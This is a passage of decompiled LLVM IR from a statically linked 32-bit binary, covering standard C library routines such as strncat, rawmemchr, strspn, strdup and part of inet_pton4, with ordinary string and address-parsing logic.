  %v20_8053b4b = phi i32 [ %v23_8053b4b, %dec_label_pc_8053b4e ], [ %arg2, %entry ]
  %v4_8053b4a = phi i32 [ %v6_8053b4a, %dec_label_pc_8053b4e ], [ %v4_8053b4a.pre, %entry ]
  %v7_8053b4a = phi i32 [ %v10_8053b4a, %dec_label_pc_8053b4e ], [ %v4_8053b42, %entry ]
  %v1_8053b4a = inttoptr i32 %v7_8053b4a to i8*
  %v2_8053b4a = load i8, i8* %v1_8053b4a, align 1
  %v3_8053b4b = inttoptr i32 %v20_8053b4b to i8*
  %v4_8053b4b = load i8, i8* %v3_8053b4b, align 1
  %v15_8053b4b = icmp eq i8 %v2_8053b4a, %v4_8053b4b
  %v1_8053b4c = icmp eq i1 %v15_8053b4b, false
  br i1 %v1_8053b4c, label %dec_label_pc_8053b56, label %dec_label_pc_8053b4e

dec_label_pc_8053b4e:                             ; preds = %dec_label_pc_8053b4a
  %v3_8053b4a = zext i8 %v2_8053b4a to i32
  %v5_8053b4a = and i32 %v4_8053b4a, -256
  %v6_8053b4a = or i32 %v3_8053b4a, %v5_8053b4a
  %v23_8053b4b = add i32 %v20_8053b4b, %v9_8053b4a
  %v10_8053b4a = add i32 %v7_8053b4a, %v9_8053b4a
  %v4_8053b4e = icmp eq i8 %v2_8053b4a, 0
  %v1_8053b50 = icmp eq i1 %v4_8053b4e, false
  br i1 %v1_8053b50, label %dec_label_pc_8053b4a, label %dec_label_pc_8053b5a

dec_label_pc_8053b56:                             ; preds = %dec_label_pc_8053b4a
  br label %dec_label_pc_8053b5a

dec_label_pc_8053b5a:                             ; preds = %dec_label_pc_8053b4e, %dec_label_pc_8053b56
  %storemerge = phi i32 [ 1, %dec_label_pc_8053b56 ], [ 0, %dec_label_pc_8053b4e ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8053b4a, { 1, 2, 0 }
  uselistorder i32 %v9_8053b4a, { 1, 0 }
  uselistorder label %dec_label_pc_8053b5a, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053b63 = load i32, i32* @esi, align 4
  store i32 %v0_8053b63, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8053b67 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8053b67, i32* %esi.global-to-local, align 4
  %v4_8053b6f = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8053b73 = call i32 @_strlen(i8* %v4_8053b6f)
  %v2_8053b75 = add i32 %tmp, -1
  store i32 %v2_8053b75, i32* %edi.global-to-local, align 4
  %v8_8053b7913 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053b7913, label %dec_label_pc_8053b84, label %dec_label_pc_8053b7c.lr.ph

dec_label_pc_8053b7c.lr.ph:                       ; preds = %entry
  %v4_8053b7c.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8053b7c.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8053b7c

dec_label_pc_8053b7c:                             ; preds = %dec_label_pc_8053b7c.lr.ph, %dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge
  %v8_8053b7c = phi i1 [ %v8_8053b7c.pre, %dec_label_pc_8053b7c.lr.ph ], [ %v5_8053b7d, %dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge ]
  %v4_8053b7c = phi i32 [ %v4_8053b7c.pre, %dec_label_pc_8053b7c.lr.ph ], [ %v0_8053b7e, %dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge ]
  %v2_8053b8615 = phi i32 [ %v2_8053b75, %dec_label_pc_8053b7c.lr.ph ], [ %v7_8053b7d, %dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge ]
  %v0_8053b7c = load i32, i32* %esi.global-to-local, align 4
  %v1_8053b7c = inttoptr i32 %v0_8053b7c to i8*
  %v2_8053b7c = load i8, i8* %v1_8053b7c, align 1
  %v3_8053b7c = zext i8 %v2_8053b7c to i32
  %v5_8053b7c = and i32 %v4_8053b7c, -256
  %v6_8053b7c = or i32 %v5_8053b7c, %v3_8053b7c
  store i32 %v6_8053b7c, i32* %eax.global-to-local, align 4
  %v9_8053b7c = select i1 %v8_8053b7c, i32 -1, i32 1
  %v10_8053b7c = add i32 %v9_8053b7c, %v0_8053b7c
  store i32 %v10_8053b7c, i32* %esi.global-to-local, align 4
  %v3_8053b7d = inttoptr i32 %v2_8053b8615 to i8*
  store i8 %v2_8053b7c, i8* %v3_8053b7d, align 1
  %v4_8053b7d = load i32, i32* %edi.global-to-local, align 4
  %v5_8053b7d = load i1, i1* @df, align 1
  %v6_8053b7d = select i1 %v5_8053b7d, i32 -1, i32 1
  %v7_8053b7d = add i32 %v6_8053b7d, %v4_8053b7d
  store i32 %v7_8053b7d, i32* %edi.global-to-local, align 4
  %v0_8053b7e = load i32, i32* %eax.global-to-local, align 4
  %v3_8053b7e = trunc i32 %v0_8053b7e to i8
  %v4_8053b7e = icmp eq i8 %v3_8053b7e, 0
  %v1_8053b80 = icmp eq i1 %v4_8053b7e, false
  br i1 %v1_8053b80, label %dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge, label %dec_label_pc_8053b87

dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge: ; preds = %dec_label_pc_8053b7c
  %v0_8053b79.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053b79 = add i32 %v0_8053b79.pre, -1
  %v8_8053b79 = icmp eq i32 %v1_8053b79, 0
  store i32 %v1_8053b79, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053b79, label %dec_label_pc_8053b84, label %dec_label_pc_8053b7c

dec_label_pc_8053b84:                             ; preds = %dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge, %entry
  %v2_8053b86.lcssa = phi i32 [ %v2_8053b75, %entry ], [ %v7_8053b7d, %dec_label_pc_8053b7c.dec_label_pc_8053b79_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8053b86 = inttoptr i32 %v2_8053b86.lcssa to i8*
  store i8 0, i8* %v3_8053b86, align 1
  %v4_8053b86 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053b86 = load i1, i1* @df, align 1
  %v6_8053b86 = select i1 %v5_8053b86, i32 -1, i32 1
  %v7_8053b86 = add i32 %v6_8053b86, %v4_8053b86
  store i32 %v7_8053b86, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053b87

dec_label_pc_8053b87:                             ; preds = %dec_label_pc_8053b7c, %dec_label_pc_8053b84
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8053b8b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053b8b, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8053b79, { 1, 0 }
  uselistorder i32 %v0_8053b7e, { 1, 0 }
  uselistorder i32 %v7_8053b7d, { 0, 2, 1 }
  uselistorder i1 %v5_8053b7d, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8053b87, { 1, 0 }
  uselistorder label %dec_label_pc_8053b7c, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053b91 = load i32, i32* @ebx, align 4
  %v4_8053b92 = urem i32 %arg2, 256
  %v4_8053b96 = ptrtoint i8* %arg1 to i32
  %v2_8053ba14 = urem i32 %v4_8053b96, 4
  %v3_8053ba15 = icmp eq i32 %v2_8053ba14, 0
  %v1_8053ba39 = icmp eq i1 %v3_8053ba15, false
  %v4_8053b9c = trunc i32 %arg2 to i8
  br i1 %v1_8053ba39, label %dec_label_pc_8053b9c, label %dec_label_pc_8053ba5

dec_label_pc_8053b9c:                             ; preds = %entry, %dec_label_pc_8053ba0
  %v0_8053ba0 = phi i32 [ %v1_8053ba0, %dec_label_pc_8053ba0 ], [ %v4_8053b96, %entry ]
  %v1_8053b9c = inttoptr i32 %v0_8053ba0 to i8*
  %v2_8053b9c = load i8, i8* %v1_8053b9c, align 1
  %v15_8053b9c = icmp eq i8 %v2_8053b9c, %v4_8053b9c
  br i1 %v15_8053b9c, label %dec_label_pc_8053bf0, label %dec_label_pc_8053ba0

dec_label_pc_8053ba0:                             ; preds = %dec_label_pc_8053b9c
  %v1_8053ba0 = add i32 %v0_8053ba0, 1
  %v2_8053ba1 = urem i32 %v1_8053ba0, 4
  %v3_8053ba1 = icmp eq i32 %v2_8053ba1, 0
  %v1_8053ba3 = icmp eq i1 %v3_8053ba1, false
  br i1 %v1_8053ba3, label %dec_label_pc_8053b9c, label %dec_label_pc_8053ba5

dec_label_pc_8053ba5:                             ; preds = %entry, %dec_label_pc_8053ba0
  %v0_8053ba8 = phi i32 [ %v1_8053ba0, %dec_label_pc_8053ba0 ], [ %v4_8053b96, %entry ]
  %v2_8053bac = mul nuw nsw i32 %v4_8053b92, 256
  %v2_8053baf = or i32 %v2_8053bac, %v4_8053b92
  %v2_8053bb3 = mul i32 %v2_8053baf, 65536
  %v2_8053bb6 = or i32 %v2_8053bb3, %v2_8053baf
  br label %dec_label_pc_8053bb8

dec_label_pc_8053bb8:                             ; preds = %dec_label_pc_8053be8, %dec_label_pc_8053bb8, %dec_label_pc_8053ba5
  %v0_8053bbc = phi i32 [ %v0_8053ba8, %dec_label_pc_8053ba5 ], [ %v1_8053bbc, %dec_label_pc_8053bb8 ], [ %v1_8053bbc, %dec_label_pc_8053be8 ]
  %v2_8053bba = inttoptr i32 %v0_8053bbc to i32*
  %v3_8053bba = load i32, i32* %v2_8053bba, align 4
  %v4_8053bba = xor i32 %v3_8053bba, %v2_8053bb6
  %v1_8053bbc = add i32 %v0_8053bbc, 4
  store i32 %v1_8053bbc, i32* @ecx, align 4
  %v1_8053bbf = add i32 %v4_8053bba, 2130640639
  %v1_8053bc5 = sub i32 -1, %v4_8053bba
  store i32 %v1_8053bc5, i32* @edx, align 4
  %v2_8053bc7 = xor i32 %v1_8053bbf, %v1_8053bc5
  %v1_8053bc9 = and i32 %v2_8053bc7, -2130640640
  %v2_8053bc9 = icmp eq i32 %v1_8053bc9, 0
  br i1 %v2_8053bc9, label %dec_label_pc_8053bb8, label %dec_label_pc_8053bd0

dec_label_pc_8053bd0:                             ; preds = %dec_label_pc_8053bb8
  %v2_8053bd0 = inttoptr i32 %v0_8053bbc to i8*
  %v3_8053bd0 = load i8, i8* %v2_8053bd0, align 1
  %v16_8053bd0 = icmp eq i8 %v3_8053bd0, %v4_8053b9c
  br i1 %v16_8053bd0, label %dec_label_pc_8053bf0, label %dec_label_pc_8053bd8

dec_label_pc_8053bd8:                             ; preds = %dec_label_pc_8053bd0
  %v1_8053bd8 = add i32 %v0_8053bbc, 1
  %v2_8053bd8 = inttoptr i32 %v1_8053bd8 to i8*
  %v3_8053bd8 = load i8, i8* %v2_8053bd8, align 1
  %v16_8053bd8 = icmp eq i8 %v3_8053bd8, %v4_8053b9c
  br i1 %v16_8053bd8, label %dec_label_pc_8053bf0, label %dec_label_pc_8053be0

dec_label_pc_8053be0:                             ; preds = %dec_label_pc_8053bd8
  %v1_8053be0 = add i32 %v0_8053bbc, 2
  %v2_8053be0 = inttoptr i32 %v1_8053be0 to i8*
  %v3_8053be0 = load i8, i8* %v2_8053be0, align 1
  %v16_8053be0 = icmp eq i8 %v3_8053be0, %v4_8053b9c
  br i1 %v16_8053be0, label %dec_label_pc_8053bf0, label %dec_label_pc_8053be8

dec_label_pc_8053be8:                             ; preds = %dec_label_pc_8053be0
  %v1_8053be8 = add i32 %v0_8053bbc, 3
  %v2_8053be8 = inttoptr i32 %v1_8053be8 to i8*
  %v3_8053be8 = load i8, i8* %v2_8053be8, align 1
  %v16_8053be8 = icmp eq i8 %v3_8053be8, %v4_8053b9c
  %v1_8053bee = icmp eq i1 %v16_8053be8, false
  br i1 %v1_8053bee, label %dec_label_pc_8053bb8, label %dec_label_pc_8053bf0

dec_label_pc_8053bf0:                             ; preds = %dec_label_pc_8053b9c, %dec_label_pc_8053be8, %dec_label_pc_8053be0, %dec_label_pc_8053bd8, %dec_label_pc_8053bd0
  %v0_8053bf2 = phi i32 [ %v1_8053be8, %dec_label_pc_8053be8 ], [ %v1_8053be0, %dec_label_pc_8053be0 ], [ %v1_8053bd8, %dec_label_pc_8053bd8 ], [ %v0_8053bbc, %dec_label_pc_8053bd0 ], [ %v0_8053ba0, %dec_label_pc_8053b9c ]
  store i32 %v0_8053b91, i32* @ebx, align 4
  ret i32 %v0_8053bf2

; uselistorder directives
  uselistorder i32 %v1_8053bc5, { 1, 0 }
  uselistorder i32 %v1_8053bbc, { 2, 1, 0 }
  uselistorder i32 %v2_8053baf, { 1, 0 }
  uselistorder i32 %v1_8053ba0, { 1, 0, 2 }
  uselistorder i8 %v4_8053b9c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8053b96, { 2, 1, 0 }
  uselistorder i32 %v4_8053b92, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8053bf0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053ba5, { 1, 0 }
  uselistorder label %dec_label_pc_8053b9c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8053c1631 = load i8, i8* %arg1, align 1
  %v4_8053c1835 = icmp eq i8 %v2_8053c1631, 0
  br i1 %v4_8053c1835, label %dec_label_pc_8053c20, label %dec_label_pc_8053c1c.lr.ph

dec_label_pc_8053c1c.lr.ph:                       ; preds = %entry
  %v3_8053c1632 = zext i8 %v2_8053c1631 to i32
  %v4_8053c16.pre = load i32, i32* @eax, align 4
  %v5_8053c1633 = and i32 %v4_8053c16.pre, -256
  %v6_8053c1634 = or i32 %v3_8053c1632, %v5_8053c1633
  %v4_8053bfd = ptrtoint i8* %arg1 to i32
  %v1_8053c0818 = inttoptr i32 %arg2 to i8*
  %v4_8053c08.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053c1c

dec_label_pc_8053c03:                             ; preds = %dec_label_pc_8053c1c, %dec_label_pc_8053c07
  %v6_8053c0828 = phi i32 [ %v6_8053c08, %dec_label_pc_8053c07 ], [ %v6_8053c0822, %dec_label_pc_8053c1c ]
  %v2_8053c0827 = phi i8 [ %v2_8053c08, %dec_label_pc_8053c07 ], [ %v2_8053c0819, %dec_label_pc_8053c1c ]
  %v0_8053c0726 = phi i32 [ %v1_8053c07, %dec_label_pc_8053c07 ], [ %arg2, %dec_label_pc_8053c1c ]
  %v15_8053c03 = icmp eq i8 %v2_8053c1639, %v2_8053c0827
  br i1 %v15_8053c03, label %dec_label_pc_8053c10, label %dec_label_pc_8053c07

dec_label_pc_8053c07:                             ; preds = %dec_label_pc_8053c03
  %v1_8053c07 = add i32 %v0_8053c0726, 1
  store i32 %v1_8053c07, i32* @edx, align 4
  %v1_8053c08 = inttoptr i32 %v1_8053c07 to i8*
  %v2_8053c08 = load i8, i8* %v1_8053c08, align 1
  %v3_8053c08 = zext i8 %v2_8053c08 to i32
  %v5_8053c08 = and i32 %v6_8053c0828, -256
  %v6_8053c08 = or i32 %v3_8053c08, %v5_8053c08
  store i32 %v6_8053c08, i32* @ecx, align 4
  %v4_8053c0a = icmp eq i8 %v2_8053c08, 0
  %v1_8053c0c = icmp eq i1 %v4_8053c0a, false
  br i1 %v1_8053c0c, label %dec_label_pc_8053c03, label %dec_label_pc_8053c20

dec_label_pc_8053c10:                             ; preds = %dec_label_pc_8053c03
  %v1_8053c14 = add i32 %v0_8053c2137, 1
  %v1_8053c15 = add i32 %v0_8053c1538, 1
  %v1_8053c16 = inttoptr i32 %v1_8053c15 to i8*
  %v2_8053c16 = load i8, i8* %v1_8053c16, align 1
  %v3_8053c16 = zext i8 %v2_8053c16 to i32
  %v5_8053c16 = and i32 %v6_8053c1640, -256
  %v6_8053c16 = or i32 %v3_8053c16, %v5_8053c16
  %v4_8053c18 = icmp eq i8 %v2_8053c16, 0
  br i1 %v4_8053c18, label %dec_label_pc_8053c20, label %dec_label_pc_8053c1c

dec_label_pc_8053c1c:                             ; preds = %dec_label_pc_8053c1c.lr.ph, %dec_label_pc_8053c10
  %v4_8053c08.pre = phi i32 [ %v4_8053c08.pre.pre, %dec_label_pc_8053c1c.lr.ph ], [ %v6_8053c0828, %dec_label_pc_8053c10 ]
  %v6_8053c1640 = phi i32 [ %v6_8053c1634, %dec_label_pc_8053c1c.lr.ph ], [ %v6_8053c16, %dec_label_pc_8053c10 ]
  %v2_8053c1639 = phi i8 [ %v2_8053c1631, %dec_label_pc_8053c1c.lr.ph ], [ %v2_8053c16, %dec_label_pc_8053c10 ]
  %v0_8053c1538 = phi i32 [ %v4_8053bfd, %dec_label_pc_8053c1c.lr.ph ], [ %v1_8053c15, %dec_label_pc_8053c10 ]
  %v0_8053c2137 = phi i32 [ 0, %dec_label_pc_8053c1c.lr.ph ], [ %v1_8053c14, %dec_label_pc_8053c10 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8053c0819 = load i8, i8* %v1_8053c0818, align 1
  %v3_8053c0820 = zext i8 %v2_8053c0819 to i32
  %v5_8053c0821 = and i32 %v4_8053c08.pre, -256
  %v6_8053c0822 = or i32 %v3_8053c0820, %v5_8053c0821
  store i32 %v6_8053c0822, i32* @ecx, align 4
  %v4_8053c0a23 = icmp eq i8 %v2_8053c0819, 0
  %v1_8053c0c25 = icmp eq i1 %v4_8053c0a23, false
  br i1 %v1_8053c0c25, label %dec_label_pc_8053c03, label %dec_label_pc_8053c20

dec_label_pc_8053c20:                             ; preds = %entry, %dec_label_pc_8053c10, %dec_label_pc_8053c1c, %dec_label_pc_8053c07
  %v0_8053c2117 = phi i32 [ %v0_8053c2137, %dec_label_pc_8053c07 ], [ %v0_8053c2137, %dec_label_pc_8053c1c ], [ 0, %entry ], [ %v1_8053c14, %dec_label_pc_8053c10 ]
  ret i32 %v0_8053c2117

; uselistorder directives
  uselistorder i32 %v6_8053c0822, { 1, 0 }
  uselistorder i8 %v2_8053c0819, { 1, 2, 0 }
  uselistorder i32 %v1_8053c15, { 1, 0 }
  uselistorder i32 %v6_8053c08, { 1, 0 }
  uselistorder i8 %v2_8053c08, { 1, 2, 0 }
  uselistorder i32 %v1_8053c07, { 2, 1, 0 }
  uselistorder i8 %v2_8053c1631, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053c20, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8053c1c, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053c28 = load i32, i32* @edi, align 4
  %v0_8053c29 = load i32, i32* @esi, align 4
  %v0_8053c2a = load i32, i32* @ebx, align 4
  store i32 %v0_8053c2a, i32* %stack_var_-12, align 4
  %v4_8053c2b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053c2b, i32* @edi, align 4
  %v3_8053c33 = call i32 @strlen(i8* %arg1)
  %v1_8053c38 = add i32 %v3_8053c33, 1
  store i32 %v1_8053c38, i32* @esi, align 4
  %v2_8053c3e = call i32 @malloc(i32 %v1_8053c38)
  %v1_8053c46 = icmp eq i32 %v2_8053c3e, 0
  store i32 %v2_8053c3e, i32* %ebx.global-to-local, align 4
  br i1 %v1_8053c46, label %dec_label_pc_8053c58, label %dec_label_pc_8053c4c

dec_label_pc_8053c4c:                             ; preds = %entry
  %v0_8053c4d = load i32, i32* @esi, align 4
  %v0_8053c4e = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8053c3e to i16*
  %v6_8053c50 = call i32 @memcpy(i16* %tmp11, i32 %v0_8053c4e, i32 %v0_8053c4d)
  %v0_8053c58.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c58

dec_label_pc_8053c58:                             ; preds = %entry, %dec_label_pc_8053c4c
  %v0_8053c58 = phi i32 [ 0, %entry ], [ %v0_8053c58.pre, %dec_label_pc_8053c4c ]
  %v2_8053c5a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053c5a, i32* @ebx, align 4
  store i32 %v0_8053c29, i32* @esi, align 4
  store i32 %v0_8053c28, i32* @edi, align 4
  ret i32 %v0_8053c58

; uselistorder directives
  uselistorder i32 %v2_8053c3e, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 9, 8, 7, 17, 16, 15, 2, 4, 0, 14, 13, 12, 11, 10, 6, 5, 3, 1 }
  uselistorder label %dec_label_pc_8053c58, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8053c66 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8053c69 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c69, i32* %stack_var_-16, align 4
  %v0_8053c6a = load i32, i32* @eax, align 4
  store i32 %v0_8053c6a, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8053c6c = ptrtoint i32* %stack_var_-44 to i32
  %v2_8053c6f = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053c6f, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8053cb715 = inttoptr i32 %v0_8053c6a to i8*
  %v2_8053cb716 = load i8, i8* %v1_8053cb715, align 1
  %v3_8053cb717 = sext i8 %v2_8053cb716 to i32
  store i32 %v3_8053cb717, i32* @ecx, align 4
  %v1_8053cba18 = add i32 %v0_8053c6a, 1
  store i32 %v1_8053cba18, i32* %ebx.global-to-local, align 4
  %v1_8053cbb19 = icmp eq i8 %v2_8053cb716, 0
  store i1 %v1_8053cbb19, i1* %zf.global-to-local, align 1
  %v1_8053cbd21 = icmp eq i1 %v1_8053cbb19, false
  br i1 %v1_8053cbd21, label %dec_label_pc_8053c7a, label %dec_label_pc_8053cbf

dec_label_pc_8053c7a:                             ; preds = %entry, %dec_label_pc_8053cb7.backedge
  %v3_8053cb723 = phi i32 [ %v3_8053cb7, %dec_label_pc_8053cb7.backedge ], [ %v3_8053cb717, %entry ]
  %v2_8053cb722 = phi i8 [ %v2_8053cb7, %dec_label_pc_8053cb7.backedge ], [ %v2_8053cb716, %entry ]
  %v1_8053c7a = add nsw i32 %v3_8053cb723, -48
  store i32 %v1_8053c7a, i32* @eax, align 4
  %v9_8053c7d = icmp eq i8 %v2_8053cb722, 57
  store i1 %v9_8053c7d, i1* %zf.global-to-local, align 1
  %v6_8053c80 = icmp ugt i32 %v1_8053c7a, 9
  br i1 %v6_8053c80, label %dec_label_pc_8053ca3, label %dec_label_pc_8053c82

dec_label_pc_8053c82:                             ; preds = %dec_label_pc_8053c7a
  %v0_8053c82 = load i32, i32* @esi, align 4
  %v1_8053c82 = inttoptr i32 %v0_8053c82 to i8*
  %v2_8053c82 = load i8, i8* %v1_8053c82, align 1
  %v2_8053c85 = zext i8 %v2_8053c82 to i32
  %v3_8053c85 = mul nuw nsw i32 %v2_8053c85, 10
  %v3_8053c88 = add nsw i32 %v3_8053c85, %v1_8053c7a
  store i32 %v3_8053c88, i32* @eax, align 4
  %v9_8053c8c = icmp eq i32 %v3_8053c88, 255
  store i1 %v9_8053c8c, i1* %zf.global-to-local, align 1
  %v6_8053c91 = icmp ugt i32 %v3_8053c88, 255
  br i1 %v6_8053c91, label %dec_label_pc_8053cdc, label %dec_label_pc_8053c93

dec_label_pc_8053c93:                             ; preds = %dec_label_pc_8053c82
  %v0_8053c93 = load i32, i32* @edx, align 4
  %v1_8053c93 = icmp eq i32 %v0_8053c93, 0
  store i1 %v1_8053c93, i1* %zf.global-to-local, align 1
  %v1_8053c95 = trunc i32 %v3_8053c88 to i8
  store i8 %v1_8053c95, i8* %v1_8053c82, align 1
  %v0_8053c97 = load i1, i1* %zf.global-to-local, align 1
  %v1_8053c97 = icmp eq i1 %v0_8053c97, false
  br i1 %v1_8053c97, label %dec_label_pc_8053cb7.backedge, label %dec_label_pc_8053c99

dec_label_pc_8053c99:                             ; preds = %dec_label_pc_8053c93
  %v0_8053c99 = load i32, i32* @edi, align 4
  %v1_8053c99 = add i32 %v0_8053c99, 1
  store i32 %v1_8053c99, i32* @edi, align 4
  %v1_8053c9a = add i32 %v0_8053c99, -3
  %v6_8053c9a = sub i32 2, %v0_8053c99
  %v7_8053c9a = and i32 %v6_8053c9a, %v1_8053c99
  %v8_8053c9a = icmp slt i32 %v7_8053c9a, 0
  %v9_8053c9a = icmp eq i32 %v1_8053c9a, 0
  store i1 %v9_8053c9a, i1* %zf.global-to-local, align 1
  %v10_8053c9a = icmp slt i32 %v1_8053c9a, 0
  %v3_8053c9d = icmp eq i1 %v10_8053c9a, %v8_8053c9a
  %v4_8053c9d = icmp eq i1 %v9_8053c9a, false
  %v5_8053c9d = and i1 %v4_8053c9d, %v3_8053c9d
  br i1 %v5_8053c9d, label %dec_label_pc_8053cdc, label %dec_label_pc_8053c9f

dec_label_pc_8053c9f:                             ; preds = %dec_label_pc_8053c99
  %v0_8053c9f = load i32, i32* @edx, align 4
  %v1_8053c9f = and i32 %v0_8053c9f, -256
  %v2_8053c9f = or i32 %v1_8053c9f, 1
  store i32 %v2_8053c9f, i32* @edx, align 4
  br label %dec_label_pc_8053cb7.backedge

dec_label_pc_8053ca3:                             ; preds = %dec_label_pc_8053c7a
  %v9_8053ca3 = icmp eq i8 %v2_8053cb722, 46
  store i1 %v9_8053ca3, i1* %zf.global-to-local, align 1
  %v1_8053ca6 = icmp eq i1 %v9_8053ca3, false
  br i1 %v1_8053ca6, label %dec_label_pc_8053cdc, label %dec_label_pc_8053ca8

dec_label_pc_8053ca8:                             ; preds = %dec_label_pc_8053ca3
  %v0_8053ca8 = load i32, i32* @edx, align 4
  %v1_8053ca8 = icmp eq i32 %v0_8053ca8, 0
  store i1 %v1_8053ca8, i1* %zf.global-to-local, align 1
  br i1 %v1_8053ca8, label %dec_label_pc_8053cdc, label %dec_label_pc_8053cac

dec_label_pc_8053cac:                             ; preds = %dec_label_pc_8053ca8
  %v0_8053cac = load i32, i32* @edi, align 4
  %v9_8053cac = icmp eq i32 %v0_8053cac, 4
  store i1 %v9_8053cac, i1* %zf.global-to-local, align 1
  br i1 %v9_8053cac, label %dec_label_pc_8053cdc, label %dec_label_pc_8053cb1

dec_label_pc_8053cb1:                             ; preds = %dec_label_pc_8053cac
  %v0_8053cb1 = load i32, i32* @esi, align 4
  %v1_8053cb1 = add i32 %v0_8053cb1, 1
  store i32 %v1_8053cb1, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8053cb4 = inttoptr i32 %v1_8053cb1 to i8*
  store i8 0, i8* %v1_8053cb4, align 1
  br label %dec_label_pc_8053cb7.backedge

dec_label_pc_8053cb7.backedge:                    ; preds = %dec_label_pc_8053cb1, %dec_label_pc_8053c9f, %dec_label_pc_8053c93
  %v0_8053cb7.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cb7 = inttoptr i32 %v0_8053cb7.pre to i8*
  %v2_8053cb7 = load i8, i8* %v1_8053cb7, align 1
  %v3_8053cb7 = sext i8 %v2_8053cb7 to i32
  store i32 %v3_8053cb7, i32* @ecx, align 4
  %v1_8053cba = add i32 %v0_8053cb7.pre, 1
  store i32 %v1_8053cba, i32* %ebx.global-to-local, align 4
  %v1_8053cbb = icmp eq i8 %v2_8053cb7, 0
  store i1 %v1_8053cbb, i1* %zf.global-to-local, align 1
  %v1_8053cbd = icmp eq i1 %v1_8053cbb, false
  br i1 %v1_8053cbd, label %dec_label_pc_8053c7a, label %dec_label_pc_8053cb7.dec_label_pc_8053cbf_crit_edge

dec_label_pc_8053cb7.dec_label_pc_8053cbf_crit_edge: ; preds = %dec_label_pc_8053cb7.backedge
  %v0_8053cbf.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053cbf

dec_label_pc_8053cbf:                             ; preds = %dec_label_pc_8053cb7.dec_label_pc_8053cbf_crit_edge, %entry
  %v0_8053cbf = phi i32 [ %v0_8053cbf.pre, %dec_label_pc_8053cb7.dec_label_pc_8053cbf_crit_edge ], [ 0, %entry ]
  %v10_8053cbf = icmp eq i32 %v0_8053cbf, 3
  store i1 %v10_8053cbf, i1* %zf.global-to-local, align 1
  %v7_8053cc2 = icmp sgt i32 %v0_8053cbf, 3
  br i1 %v7_8053cc2, label %dec_label_pc_8053cc4, label %dec_label_pc_8053cdc

dec_label_pc_8053cc4:                             ; preds = %dec_label_pc_8053cbf
